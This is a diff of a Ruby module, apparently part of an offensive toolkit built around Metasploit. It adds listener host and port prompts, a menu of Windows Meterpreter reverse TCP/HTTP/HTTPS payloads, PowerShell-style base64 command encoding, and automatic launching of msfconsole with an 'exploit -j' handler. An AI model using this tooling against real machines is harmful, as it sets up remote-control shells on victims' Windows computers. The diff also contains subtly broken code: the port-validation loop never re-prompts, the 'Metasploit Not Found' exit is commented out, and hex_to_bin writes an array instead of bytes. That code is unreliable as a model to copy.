@@ -4,31 +4,50 @@ require 'base64'
 include Core::Commands
 
 module Msf
-  def encode_command(command)
-    Base64.encode64(command.encode('utf-16le')).delete("\r\n")
-  end
+  class Options
+    def encode_command(command)
+      Base64.encode64(command.encode('utf-16le')).delete("\r\n")
+    end
 
-  def random_name_gen
-    random_length = rand(4..8)
-    file_name = random_length.to_i.times.map do
-      [*'a'..'z', *'A'..'Z', *'0'..'9'].sample
-    end.join
-    file_name
-  end
+    def random_name_gen
+      random_length = rand(4..8)
+      file_name = random_length.to_i.times.map do
+        [*'a'..'z', *'A'..'Z', *'0'..'9'].sample
+      end.join
+      file_name
+    end
 
-  def hex_to_bin(file_name, hex_string)
-    File.open(file_name, 'w') do |f|
-      # f.write(hex_string.scan(/../).map { |x| x.hex }.pack('c*'))
-      f.write(hex_string.scan(/../).map(&:hex))
+    def hex_to_bin(file_name, hex_string)
+      File.open(file_name, 'w') do |f|
+        # f.write(hex_string.scan(/../).map { |x| x.hex }.pack('c*'))
+        f.write(hex_string.scan(/../).map(&:hex))
+      end
+    end
+
+    def bin_to_hex(file)
+      bin_file = File.open(file, 'rb').read
+      bin_file.unpack('H*').first
+    end
+
+    def host
+      host_name = rgets('Enter the metasploit ip/url to listen on: ',
+                        'localhost')
+      print_success("Using #{host_name} as metasploit server")
+      host_name
+    end
+
+    def port
+      port = rgets('Enter the port you would like to use[443]: ', 443)
+      until (1..65_535).cover?(port.to_i)
+        print_error('Not a valid port')
+        sleep(1)
+      end
+      print_success("Using #{port}")
+      port
     end
   end
 
-  def bin_to_hex(file)
-    bin_file = File.open(file, 'rb').read
-    bin_file.unpack('H*').first
-  end
-
-  class MsfCommands
+  class MsfCommands < Options
     include Core::Files
     def initialize
       if File.exist?('/usr/bin/msfvenom')
@@ -37,8 +56,16 @@ module Msf
         @msf_path = ('/opt/metasploit-framework/')
       else
         print_error('Metasploit Not Found!')
-        exit
+        # exit
       end
+    end
+
+    def payload_select
+      payload_options.each do |key, opt|
+        puts "#{key}) #{opt}"
+      end
+      choice = rgets('Choice: ', '1')
+      payload_options[choice.to_sym]
     end
 
     def generate_shellcode(host, port, payload)
@@ -60,6 +87,14 @@ module Msf
       write_rc(file_path, rc_file, host, port)
       print_info("Setting up Metasploit this may take a moment\n")
       system("#{@msf_path}./msfconsole -r #{file_path}#{rc_file}")
+    end
+
+    def start_metasploit?
+      answer = ''
+      until answer.downcase[0] == 'y' || answer.downcase[0] == 'n'
+        answer = rgets('Start Metasploit? ', 'y')
+      end
+      answer.downcase[0] == 'y' ? true : false
     end
 
     private
@@ -84,6 +119,12 @@ module Msf
       file.write("set ExitOnSession false\n")
       file.write('exploit -j')
       file.close
+    end
+
+    def payload_options
+      { :'1' => 'windows/meterpreter/reverse_tcp',
+        :'2' => 'windows/meterpreter/reverse_https',
+        :'3' => 'windows/meterpreter/reverse_http' }
     end
   end
 end
